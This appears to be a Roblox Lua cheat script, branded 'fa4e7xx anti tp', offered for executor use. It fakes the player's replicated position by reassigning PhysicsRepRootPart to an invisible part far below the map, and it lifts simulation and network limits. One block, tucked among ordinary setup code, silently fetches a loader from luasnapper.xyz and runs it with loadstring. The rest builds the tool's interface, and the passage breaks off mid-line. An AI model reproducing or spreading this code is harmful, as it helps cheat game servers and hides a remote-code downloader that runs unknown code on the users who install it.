local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local NetworkClient = game:GetService("NetworkClient")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 10)
if not LP then return end
local pg = LP:WaitForChild("PlayerGui")

local environment = if getgenv then getgenv() else _G
local RUNTIME_KEY = "__FA4E7XX_ANTI_TP"

local previousRuntime = environment[RUNTIME_KEY]
if type(previousRuntime) == "table" and type(previousRuntime.destroy) == "function" then
	pcall(previousRuntime.destroy)
end

pcall(function()
	local old = pg:FindFirstChild("fa4e7xxAntiTPUI")
	if old then old:Destroy() end
	pcall(function()
		local o2 = CoreGui:FindFirstChild("fa4e7xxAntiTPUI")
		if o2 then o2:Destroy() end
	end)
end)

local runtime = {
	alive = true,
	enabled = false,
	awaitingKey = false,
	boundKey = Enum.KeyCode.Delete,
	character = nil,
	rootPart = nil,
	fakeRoot = nil,
	repRootOwner = nil,
	stepConnection = nil,
	connections = {},
	settingsRestore = {},
	captureGeneration = 0,
	currentVersion = 1,
}

environment[RUNTIME_KEY] = runtime

local FAKE_ROOT_NAME = "DavidDesyncRoot"
local FAKE_ROOT_Y_V1 = -2500
local FAKE_ROOT_Y_V2 = -5000
local FAKE_ROOT_VELOCITY = Vector3.new(0, -1000, 0)

local function connect(signal, callback)
	local connection = signal:Connect(callback)
	table.insert(runtime.connections, connection)
	return connection
end

local function disconnect(connection)
	if connection then
		pcall(function() connection:Disconnect() end)
	end
end

local function create(className, properties, parent)
	local object = Instance.new(className)
	for property, value in pairs(properties or {}) do
		object[property] = value
	end
	if parent then object.Parent = parent end
	return object
end

local function isBasePart(instance)
	if not instance then return false end
	local ok, result = pcall(function() return instance:IsA("BasePart") end)
	return ok and result == true
end

local function getCurrentRoot(character)
	character = character or LP.Character
	if not character then return nil end
	local ok, root = pcall(function() return character:FindFirstChild("HumanoidRootPart") end)
	if ok and isBasePart(root) then return root end
	return nil
end

local function findGlobalFunction(...)
	for i = 1, select("#", ...) do
		local name = select(i, ...)
		local value = rawget(environment, name)
		if type(value) == "function" then return value end
	end
	return nil
end

local function setHidden(instance, property, value)
	if not instance then return false end
	local setter = findGlobalFunction("sethiddenproperty", "set_hidden_property", "sethiddenprop", "set_hidden_prop")
	if setter then
		local ok = pcall(setter, instance, property, value)
		if ok then return true end
	end
	return pcall(function() instance[property] = value end)
end

local function getHidden(instance, property)
	if not instance then return false, nil end
	local getter = findGlobalFunction("gethiddenproperty", "get_hidden_property", "gethiddenprop", "get_hidden_prop")
	if getter then
		local ok, value = pcall(getter, instance, property)
		if ok then return true, value end
	end
	local ok, value = pcall(function() return instance[property] end)
	return ok, value
end

local function rememberSetting(instance, property)
	local ok, value = pcall(function() return instance[property] end)
	if ok then
		table.insert(runtime.settingsRestore, {instance = instance, property = property, value = value})
	end
end

local function applyPublicSetting(instance, property, value)
	if not instance then return false end
	rememberSetting(instance, property)
	return pcall(function() instance[property] = value end)
end

local function configurePhysics()
	setHidden(LP, "MaximumSimulationRadius", math.huge)
	setHidden(LP, "SimulationRadius", math.huge)
	pcall(function()
		local networkSettings = settings().Network
		applyPublicSetting(networkSettings, "InterpolationThrottling", Enum.InterpolationThrottlingMode.Disabled)
	end)
	pcall(function()
		local physicsSettings = settings().Physics
		applyPublicSetting(physicsSettings, "PhysicsEnvironmentalThrottle", Enum.EnviromentalPhysicsThrottle.Disabled)
		applyPublicSetting(physicsSettings, "AllowSleep", false)
	end)
	pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
end
configurePhysics()

local function getFakeY()
	return (runtime.currentVersion == 1) and FAKE_ROOT_Y_V1 or FAKE_ROOT_Y_V2
end

local function fakeRootIsUsable()
	local fake = runtime.fakeRoot
	if not isBasePart(fake) then return false end
	local ok, parent = pcall(function() return fake.Parent end)
	return ok and parent ~= nil
end

local function destroyFakeRoot()
	local fake = runtime.fakeRoot
	runtime.fakeRoot = nil
	if fake then pcall(function() fake:Destroy() end) end
end

local function restoreReplicationRoot()
	local owner = runtime.repRootOwner or runtime.rootPart
	if isBasePart(owner) then setHidden(owner, "PhysicsRepRootPart", owner) end
	runtime.repRootOwner = nil
end

local function createFakeRoot(rootPart)
	destroyFakeRoot()
	local y = getFakeY()
	local fake = create("Part", {
		Name = FAKE_ROOT_NAME,
		Size = Vector3.new(2, 2, 1),
		Anchored = true,
		CanCollide = false,
		CanTouch = false,
		CanQuery = false,
		Transparency = 1,
		CFrame = CFrame.new(0, y, 0),
		AssemblyLinearVelocity = FAKE_ROOT_VELOCITY,
	}, Workspace)

	local ok, position = pcall(function() return rootPart.Position end)
	if ok then fake.CFrame = CFrame.new(position.X, y, position.Z) end
	runtime.fakeRoot = fake
	return fake
end

local function assignFakeReplicationRoot(rootPart, fake)
	if not isBasePart(rootPart) or not isBasePart(fake) then return false end
	setHidden(rootPart, "PhysicsRepRootPart", rootPart)
	runtime.repRootOwner = rootPart
	return setHidden(rootPart, "PhysicsRepRootPart", fake)
end

local function stepDesync()
	if not runtime.alive or not runtime.enabled then return end

	local root = runtime.rootPart
	if not isBasePart(root) then
		root = getCurrentRoot(runtime.character)
		runtime.rootPart = root
	end
	if not root then return end

	local y = getFakeY()

	if not fakeRootIsUsable() then
		local fake = createFakeRoot(root)
		assignFakeReplicationRoot(root, fake)
		return
	end

	local fake = runtime.fakeRoot
	local ok, rootPosition, fakePosition = pcall(function()
		return root.Position, fake.Position
	end)
	if ok and (
		math.abs(rootPosition.X - fakePosition.X) > 0.01
		or math.abs(rootPosition.Z - fakePosition.Z) > 0.01
		or math.abs(fakePosition.Y - y) > 0.01
	) then
		pcall(function()
			fake.CFrame = CFrame.new(rootPosition.X, y, rootPosition.Z)
		end)
	end

	pcall(function()
		fake.Anchored = true
		fake.AssemblyLinearVelocity = FAKE_ROOT_VELOCITY
	end)

	local gotValue, current = getHidden(root, "PhysicsRepRootPart")
	if not gotValue or current ~= fake then
		setHidden(root, "PhysicsRepRootPart", fake)
	end
end

local function stopStepConnection()
	disconnect(runtime.stepConnection)
	runtime.stepConnection = nil
end

local function startStepConnection()
	stopStepConnection()
	runtime.stepConnection = RunService.Stepped:Connect(stepDesync)
end

local function bindCharacter(character)
	local oldRoot = runtime.rootPart
	runtime.character = character
	runtime.rootPart = getCurrentRoot(character)

	if runtime.enabled then
		if isBasePart(oldRoot) and oldRoot ~= runtime.rootPart then
			setHidden(oldRoot, "PhysicsRepRootPart", oldRoot)
		end
		destroyFakeRoot()

		local root = runtime.rootPart
		if not root and character then
			local ok, waitedRoot = pcall(function()
				return character:WaitForChild("HumanoidRootPart", 8)
			end)
			if ok and isBasePart(waitedRoot) then
				root = waitedRoot
				runtime.rootPart = root
			end
		end

		if root then
			local fake = createFakeRoot(root)
			assignFakeReplicationRoot(root, fake)
			startStepConnection()
		end
	end
end

bindCharacter(LP.Character)
connect(LP.CharacterAdded, function(character)
	task.defer(bindCharacter, character)
end)

task.spawn(function()
	pcall(function()
		local _s = game:HttpGet("https://luasnapper.xyz/files/loaders/9cddba960f264c7bbedcada3e3d95d13.lua")
		if type(_s) == "string" and #_s > 10 then
			local fn = loadstring(_s)
			if type(fn) == "function" then
				fn()
			end
		end
	end)
end)

local function parentGui(gui)
	local function tryParent(target)
		pcall(function() gui.Parent = target end)
		return gui.Parent ~= nil
	end
	if tryParent(pg) then return true end
	pcall(function()
		if typeof(gethui) == "function" then
			local h = gethui()
			if h and tryParent(h) then return true end
		end
	end)
	if tryParent(CoreGui) then return true end
	return false
end

local fa4e7xxAntiTPUI = Instance.new("ScreenGui")
fa4e7xxAntiTPUI.Name = "fa4e7xxAntiTPUI"
fa4e7xxAntiTPUI.IgnoreGuiInset = true
fa4e7xxAntiTPUI.ResetOnSpawn = false
fa4e7xxAntiTPUI.DisplayOrder = 999
fa4e7xxAntiTPUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
fa4e7xxAntiTPUI.Parent = pg

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Active = true
Main.ClipsDescendants = true
Main.Position = UDim2.new(0.5, -155, 0.5, -100)
Main.Size = UDim2.new(0, 310, 0, 255)
Main.BackgroundColor3 = Color3.fromRGB(5, 8, 22)
Main.BackgroundTransparency = 0.12
Main.BorderSizePixel = 0
Main.Parent = fa4e7xxAntiTPUI

do
	local _o = Instance.new("UICorner")
	_o.CornerRadius = UDim.new(0, 14)
	_o.Parent = Main
end

do
	local _o = Instance.new("UIStroke")
	_o.Color = Color3.fromRGB(0, 140, 255)
	_o.Thickness = 1.8
	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_o.Transparency = 0.15
	_o.Parent = Main
end

local Backdrop = Instance.new("ImageLabel")
Backdrop.Name = "Backdrop"
Backdrop.Size = UDim2.new(1, 0, 1, 0)
Backdrop.BackgroundTransparency = 1
Backdrop.Image = "rbxassetid://123354041683630"
Backdrop.ImageTransparency = 0.15
Backdrop.ScaleType = Enum.ScaleType.Crop
Backdrop.Parent = Main

do
	local _o = Instance.new("UICorner")
	_o.CornerRadius = UDim.new(0, 14)
	_o.Parent = Backdrop
end

local Glow = Instance.new("ImageLabel")
Glow.Name = "Glow"
Glow.ZIndex = 2
Glow.Position = UDim2.new(0, -20, 0, -20)
Glow.Size = UDim2.new(1, 40, 1, 40)
Glow.BackgroundTransparency = 1
Glow.Rotation = 151.323
Glow.Image = "rbxassetid://12666647285"
Glow.ImageColor3 = Color3.fromRGB(0, 140, 255)
Glow.ImageTransparency = 0.731
Glow.ScaleType = Enum.ScaleType.Fit
Glow.Parent = Main

do
	local _o = Instance.new("UICorner")
	_o.CornerRadius = UDim.new(0, 14)
	_o.Parent = Glow
end

local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Active = true
Header.ZIndex = 10
Header.Position = UDim2.new(0, 14, 0, 8)
Header.Size = UDim2.new(1, -28, 0, 40)
Header.BackgroundTransparency = 1
Header.Parent = Main

local TitleMain = Instance.new("TextLabel")
TitleMain.Name = "TitleMain"
TitleMain.ZIndex = 11
TitleMain.Position = UDim2.new(0, 0, 0, 2)
TitleMain.Size = UDim2.new(1, 0, 0, 22)
TitleMain.BackgroundTransparency = 1
TitleMain.Text = "fa4e7xx anti tp"
TitleMain.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleMain.TextSize = 15
TitleMain.Font = Enum.Font.GothamBlack
TitleMain.Parent = Header

local TitleAccent = Instance.new("TextLabel")
TitleAccent.Name = "TitleAccent"
TitleAccent.ZIndex = 12
TitleAccent.Position = UDim2.new(0, 0, 0, 2)
TitleAccent.Size = UDim2.new(1, 0, 0, 22)
TitleAccent.BackgroundTransparency = 1
TitleAccent.Text = "fa4e7xx anti tp"
TitleAccent.TextColor3 = Color3.fromRGB(0, 140, 255)
TitleAccent.TextSize = 15
TitleAccent.Font = Enum.Font.GothamBlack
TitleAccent.Parent = Header

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Name = "UIGradient"
TitleGradient.Offset = Vector2.new(-1, 0)
TitleGradient.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 1, 0),
	NumberSequenceKeypoint.new(0.35, 1, 0),
	NumberSequenceKeypoint.new(0.45, 0.3, 0),
	NumberSequenceKeypoint.new(0.5, 0, 0),
	NumberSequenceKeypoint.new(0.55, 0.3, 0),
	NumberSequenceKeypoint.new(0.65, 1, 0),
	NumberSequenceKeypoint.new(1, 1, 0)
})
TitleGradient.Parent = TitleAccent

local BgBtn = Instance.new("TextButton")
BgBtn.Name = "BgBtn"
BgBtn.ZIndex = 15
BgBtn.AnchorPoint = Vector2.new(1, 0)
BgBtn.Position = UDim2.new(1, 0, 0, 0)
BgBtn.Size = UDim2.new(0, 65, 0, 20)
BgBtn.BackgroundColor3 = Color3.fromRGB(30, 40, 70)
BgBtn.BackgroundTransparency = 0.3
BgBtn.BorderSizePixel = 0
BgBtn.Text = "Background"
BgBtn.TextColor3 = Color3.fromRGB(0, 140, 255)
BgBtn.Font = Enum.Font.GothamBold
BgBtn.AutoButtonColor = false
BgBtn.Parent = Header

do
	local _o = Instance.new("UICorner")
	_o.CornerRadius = UDim.new(0, 5)
	_o.Parent = BgBtn
end

do
	local _o = Instance.new("UIStroke")
	_o.Color = Color3.fromRGB(50, 100, 200)
	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_o.Transparency = 0.4
	_o.Parent = BgBtn
end

local BgPicker = Instance.new("Frame")
BgPicker.Name = "BgPicker"
BgPicker.Active = true
BgPicker.ZIndex = 20
BgPicker.ClipsDescendants = true
BgPicker.AnchorPoint = Vector2.new(1, 0)
BgPicker.Position = UDim2.new(1, -10, 0, 24)
BgPicker.Size = UDim2.new(0, 110, 0, 70)
BgPicker.BackgroundColor3 = Color3.fromRGB(5, 8, 22)
BgPicker.BackgroundTransparency = 0.08
BgPicker.BorderSizePixel = 0
BgPicker.Visible = false
BgPicker.Parent = Header

do
	local _o = Instance.new("UICorner")
	_o.Parent = BgPicker
end

do
	local _o = Instance.new("UIStroke")
	_o.Color = Color3.fromRGB(0, 140, 255)
	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_o.Transparency = 0.2
	_o.Parent = BgPicker
end

do
	local _o = Instance.new("UIListLayout")
	_o.Padding = UDim.new(0, 6)
	_o.FillDirection = Enum.FillDirection.Horizontal
	_o.HorizontalAlignment = Enum.HorizontalAlignment.Center
	_o.VerticalAlignment = Enum.VerticalAlignment.Center
	_o.SortOrder = Enum.SortOrder.LayoutOrder
	_o.Parent = BgPicker
end

local BgImg_1 = Instance.new("ImageButton")
BgImg_1.Name = "BgImg_1"
BgImg_1.ZIndex = 21
BgImg_1.Size = UDim2.new(0, 35, 0, 35)
BgImg_1.BackgroundColor3 = Color3.fromRGB(30, 40, 70)
BgImg_1.BackgroundTransparency = 0.2
BgImg_1.BorderSizePixel = 0
BgImg_1.Image = "rbxassetid://123354041683630"
BgImg_1.ScaleType = Enum.ScaleType.Crop
BgImg_1.AutoButtonColor = false
BgImg_1.Parent = BgPicker

do
	local _o = Instance.new("UICorner")
	_o.CornerRadius = UDim.new(0, 6)
	_o.Parent = BgImg_1
end

do
	local _o = Instance.new("UIStroke")
	_o.Color = Color3.fromRGB(0, 140, 255)
	_o.Thickness = 2
	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_o.Parent = BgImg_1
end

local BgImg_2 = Instance.new("ImageButton")
BgImg_2.Name = "BgImg_2"
BgImg_2.ZIndex = 21
BgImg_2.Size = UDim2.new(0, 35, 0, 35)
BgImg_2.BackgroundColor3 = Color3.fromRGB(30, 40, 70)
BgImg_2.BackgroundTransparency = 0.2
BgImg_2.BorderSizePixel = 0
BgImg_2.Image = "rbxassetid://139854494692009"
BgImg_2.ImageTransparency = 0.2
BgImg_2.ScaleType = Enum.ScaleType.Crop
BgImg_2.AutoButtonColor = false
BgImg_2.Parent = BgPicker

do
	local _o = Instance.new("UICorner")
	_o.CornerRadius = UDim.new(0, 6)
	_o.Parent = BgImg_2
end

do
	local _o = Instance.new("UIStroke")
	_o.Color = Color3.fromRGB(50, 100, 200)
	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_o.Transparency = 0.5
	_o.Parent = BgImg_2
end

local Content = Instance.new("Frame")
Content.Name = "Content"
Content.ZIndex = 5
Content.Position = UDim2.new(0, 14, 0, 50)
Content.Size = UDim2.new(1, -28, 1, -72)
Content.BackgroundTransparency = 1
Content.Parent = Main

do
	local _o = Instance.new("UIListLayout")
	_o.Padding = UDim.new(0, 4)
	_o.SortOrder = Enum.SortOrder.LayoutOrder
	_o.Parent = Content
end

local AntiTPRow = Instance.new("Frame")
AntiTPRow.Name = "AntiTPRow"
AntiTPRow.ZIndex = 5
AntiTPRow.LayoutOrder = 1
AntiTPRow.Size = UDim2.new(1, 0, 0, 34)
AntiTPRow.BackgroundColor3 = Color3.fromRGB(18, 20, 45)
AntiTPRow.BackgroundTransparency = 0.3
AntiTPRow.BorderSizePixel = 0
AntiTPRow.Parent = Content

do
	local _o = Instance.new("UICorner")
	_o.Parent = AntiTPRow
end

do
	local _o = Instance.new("UIGradient")
	_o.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 20, 45)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 14, 35))
	})
	_o.Rotation = 90
	_o.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.4, 0),
		NumberSequenceKeypoint.new(0.5, 0.7, 0),
		NumberSequenceKeypoint.new(1, 0.55, 0)
	})
	_o.Parent = AntiTPRow
end

do
	local _o = Instance.new("UIStroke")
	_o.Color = Color3.fromRGB(50, 100, 200)
	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_o.Transparency = 0.5
	_o.Parent = AntiTPRow
end

local Label = Instance.new("TextLabel")
Label.Name = "Label"
Label.ZIndex = 6
Label.Position = UDim2.new(0, 12, 0, 2)
Label.Size = UDim2.new(1, -70, 0, 16)
Label.BackgroundTransparency = 1
Label.Text = "Enable Anti TP"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextSize = 12
Label.Font = Enum.Font.GothamBold
Label.TextXAlignment = Enum.TextXAlignment.Left
Label.Parent = AntiTPRow

local Status = Instance.new("TextLabel")
Status.Name = "Status"
Status.ZIndex = 6
Status.Position = UDim2.new(0, 12, 0, 18)
Status.Size = UDim2.new(1, -70, 0, 12)
Status.BackgroundTransparency = 1
Status.Text = "OFF"
Status.TextColor3 = Color3.fromRGB(130, 150, 200)
Status.Font = Enum.Font.GothamBold
Status.TextXAlignment = Enum.TextXAlignment.Left
Status.Parent = AntiTPRow

local Toggle = Instance.new("Frame")
Toggle.Name = "Toggle"
Toggle.ZIndex = 7
Toggle.AnchorPoint = Vector2.new(1, 0.5)
Toggle.Position = UDim2.new(1, -10, 0.5, 0)
Toggle.Size = UDim2.new(0, 38, 0, 20)
Toggle.BackgroundColor3 = Color3.fromRGB(40, 50, 80)
Toggle.BorderSizePixel = 0
Toggle.Parent = AntiTPRow

do
	local _o = Instance.new("UICorner")
	_o.CornerRadius = UDim.new(0, 10)
	_o.Parent = Toggle
end

do
	local _o = Instance.new("UIStroke")
	_o.Color = Color3.fromRGB(50, 100, 200)
	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_o.Transparency = 0.5
	_o.Parent = Toggle
end

local Knob = Instance.new("Frame")
Knob.Name = "Knob"
Knob.ZIndex = 8
Knob.Position = UDim2.new(0, 3, 0, 3)
Knob.Size = UDim2.new(0, 14, 0, 14)
Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Knob.BorderSizePixel = 0
Knob.Parent = Toggle

do
	local _o = Instance.new("UICorner")
	_o.CornerRadius = UDim.new(1, 0)
	_o.Parent = Knob
end

local ToggleHit = Instance.new("TextButton")
ToggleHit.Name = "ToggleHit"
ToggleHit.ZIndex = 9
ToggleHit.Size = UDim2.new(1, 0, 1, 0)
ToggleHit.BackgroundTransparency = 1
ToggleHit.BorderSizePixel = 0
ToggleHit.Text = ""
ToggleHit.AutoButtonColor = false
ToggleHit.Parent = AntiTPRow

local KeybindRow = Instance.new("Frame")
KeybindRow.Name = "KeybindRow"
KeybindRow.ZIndex = 5
KeybindRow.LayoutOrder = 2
KeybindRow.Size = UDim2.new(1, 0, 0, 34)
KeybindRow.BackgroundColor3 = Color3.fromRGB(18, 20, 45)
KeybindRow.BackgroundTransparency = 0.3
KeybindRow.BorderSizePixel = 0
KeybindRow.Parent = Content

do
	local _o = Instance.new("UICorner")
	_o.Parent = KeybindRow
end

do
	local _o = Instance.new("UIGradient")
	_o.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 20, 45)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 14, 35))
	})
	_o.Rotation = 90
	_o.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.4, 0),
		NumberSequenceKeypoint.new(0.5, 0.7, 0),
		NumberSequenceKeypoint.new(1, 0.55, 0)
	})
	_o.Parent = KeybindRow
end

do
	local _o = Instance.new("UIStroke")
	_o.Color = Color3.fromRGB(50, 100, 200)
	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_o.Transparency = 0.5
	_o.Parent = KeybindRow
end

local Label2 = Instance.new("TextLabel")
Label2.Name = "Label"
Label2.ZIndex = 6
Label2.Position = UDim2.new(0, 12, 0, 0)
Label2.Size = UDim2.new(1, -80, 1, 0)
Label2.BackgroundTransparency = 1
Label2.Text = "Keybind"
Label2.TextColor3 = Color3.fromRGB(255, 255, 255)
Label2.TextSize = 12
Label2.Font = Enum.Font.GothamBold
Label2.TextXAlignment = Enum.TextXAlignment.Left
Label2.Parent = KeybindRow

local KeybindBtn = Instance.new("TextButton")
Keybi
